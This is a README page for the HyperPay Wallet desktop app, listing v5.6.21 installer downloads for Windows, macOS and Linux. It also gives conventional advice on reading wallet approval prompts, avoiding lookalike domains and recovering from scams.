<p align="center"><img src="assets/banner-profile.png" alt="HyperPay - crypto wallet, card and custody"></p>

<h1 align="center">HyperPay Wallet</h1>

<p align="center">A wallet prompt is a contract you sign with a click, so knowing which signature is routine and which one hands over a balance matters more than speed.</p>

<p align="center">
  <a href="https://github.com/hyperpay-gateway/hyperpay-wallet/releases/tag/v5.6.21"><img src="https://img.shields.io/badge/RELEASE-v5.6.21-9DB8FF?style=for-the-badge&labelColor=0A2EA8" alt="Release v5.6.21"></a>
</p>

---

## Downloads - v5.6.21

<p align="center"><a href="https://github.com/hyperpay-gateway/hyperpay-wallet/releases/download/v5.6.21/hyperpay-wallet-windows-v5.6.21.exe"><img src="assets/button-windows.png" alt="Download for Windows"></a> <a href="https://github.com/hyperpay-gateway/hyperpay-wallet/releases/download/v5.6.21/hyperpay-wallet-macos-v5.6.21.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-macOS-9DB8FF?style=for-the-badge&labelColor=0A2EA8&logo=apple&logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/hyperpay-gateway/hyperpay-wallet/releases/download/v5.6.21/hyperpay-wallet-linux-v5.6.21.zip"><img src="https://img.shields.io/badge/DOWNLOAD-Linux-9DB8FF?style=for-the-badge&labelColor=0A2EA8&logo=linux&logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.png" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`hyperpay-wallet-windows-v5.6.21.exe`](https://github.com/hyperpay-gateway/hyperpay-wallet/releases/download/v5.6.21/hyperpay-wallet-windows-v5.6.21.exe) |
| <img src="https://img.shields.io/badge/macOS-9DB8FF?style=flat-square&labelColor=0A2EA8&logo=apple&logoColor=white" alt="macOS"> | macOS 12 or later | [`hyperpay-wallet-macos-v5.6.21.dmg`](https://github.com/hyperpay-gateway/hyperpay-wallet/releases/download/v5.6.21/hyperpay-wallet-macos-v5.6.21.dmg) |
| <img src="https://img.shields.io/badge/Linux-9DB8FF?style=flat-square&labelColor=0A2EA8&logo=linux&logoColor=white" alt="Linux"> | x64 Ubuntu 20.04 or later, or an equivalent distribution | [`hyperpay-wallet-linux-v5.6.21.zip`](https://github.com/hyperpay-gateway/hyperpay-wallet/releases/download/v5.6.21/hyperpay-wallet-linux-v5.6.21.zip) |

</div>

Checksums for the three installers are printed on the [v5.6.21 release](https://github.com/hyperpay-gateway/hyperpay-wallet/releases/tag/v5.6.21) and in the main repository README.

> Only download from this GitHub release page.

---

## Why HyperPay

Approval fatigue is the attack surface most readers never think about: a site asks for a signature, the wallet window appears, and the habit is to approve because the page was already trusted. The written guidance behind this account treats each prompt as a decision with a scope, and the scams guide is the one to read before the first unfamiliar connection rather than after it.

HyperPay as a product has run since 2017 as a hybrid wallet, pairing a custodial balance managed through HyperBC custody with a self-custody balance whose keys stay on the device. Its desktop application covers Windows, macOS and Linux, and the card, hardware devices and exchange share the same account rather than requiring new credentials.

A prompt is only as safe as the person reading it, which makes this the one part of wallet use that a faster app cannot improve. The pages here describe what a request should look like, what it should never ask for, and the point at which closing the window is the correct answer. They are written for a reader who has already been surprised once and would rather not repeat it. Each answer names the prompt, the scope and the one action that closes the exposure.

- Read the scope of a request before approving it, and reject anything broader than the task.
- Keep the phrase offline and never enter it into a page that a link or a message opened.
- Confirm the site you connected to, since lookalike domains survive on urgency alone.
- Review old approvals occasionally, because a permission granted once does not expire politely.
- Approve the smallest scope that finishes the task, and refuse a request you cannot read.
- Disconnect a site when the task is done, rather than leaving the approval for later.
- Keep the list of connected sites short, and treat an unfamiliar entry as a reason to investigate.

## Guides on approvals and identity

<div align="center">

| Guide | What it settles |
| --- | --- |
| [How scams target HyperPay users](https://github.com/hyperpay-gateway/hyperpay-name-and-trust/blob/HEAD/how-crypto-scams-target-hyperpay-users.md) | Names the three recurring attack shapes and the single rule that stops each. |
| [Is HyperPay a bank or gateway](https://github.com/hyperpay-gateway/hyperpay-name-and-trust/blob/HEAD/is-hyperpay-a-bank-or-gateway.md) | Prevents a connection to the wrong company when two share the brand name. |
| [Is HPX the same as HyperPay](https://github.com/hyperpay-gateway/hyperpay-name-and-trust/blob/HEAD/is-hpx-the-same-as-hyperpay.md) | Explains the abbreviation so a domain using it is not automatically trusted. |
| [Can a wallet be traced](https://github.com/hyperpay-gateway/hyperpay-name-and-trust/blob/HEAD/can-a-hyperpay-wallet-be-traced.md) | Sets out what the ledger exposes once an address is linked to a person. |

</div>

## This page's place in the project

This repository is one of the wallet's public repositories: the page in front of you is its front door, and the naming and scam guidance it points at is collected in [hyperpay-name-and-trust](https://github.com/hyperpay-gateway/hyperpay-name-and-trust).

## Common first questions

### What does a normal connection request look like?

It names the site, asks to see an address and asks for a signature on one specific action. It does not ask for the recovery phrase, an export of the private key or a screen share of the wallet.

### Can a signature move my funds?

A signature can authorise more than a reader expects, which is why the scope matters more than the site's reputation. Reading the request before approving it is the only control that sits with the user.

### Is a lookalike domain easy to spot?

Not always, because the page can copy the design and the wording exactly. Checking the address bar against a known link is more reliable than judging the page by how it looks.

### Do I need to disconnect after every session?

Disconnecting when a task ends keeps the number of standing approvals small. Reviewing those approvals later is harder than closing each one at the time it was made.

### What if I already approved something I did not read?

Treat the wallet as exposed. Move the balance to a fresh wallet built from a backed-up phrase and stop using the site, because waiting to see what happens gives the approval the time it already granted.

## Security

A prompt that asks for the recovery phrase, an export of the private key or a screen share is not a wallet operation at any point in the product's flow. Close it, and treat the page that produced it as hostile from then on.

## Support

Help arrives through the in-app channel, and the site publishes `support@hyperpay.dev` as an address. No support process in this repository exists, and none is offered by message.

---

<p align="center">
  <a href="https://github.com/hyperpay-gateway/hyperpay-wallet">Main application</a> -
  <a href="https://github.com/hyperpay-gateway/hyperpay-wallet/releases/tag/v5.6.21">Release v5.6.21</a> -
  <a href="https://github.com/hyperpay-gateway/hyperpay-wallet-guide">All 55 guides</a> -
  <a href="https://github.com/hyperpay-gateway/hyperpay-gateway">Profile page</a>
</p>
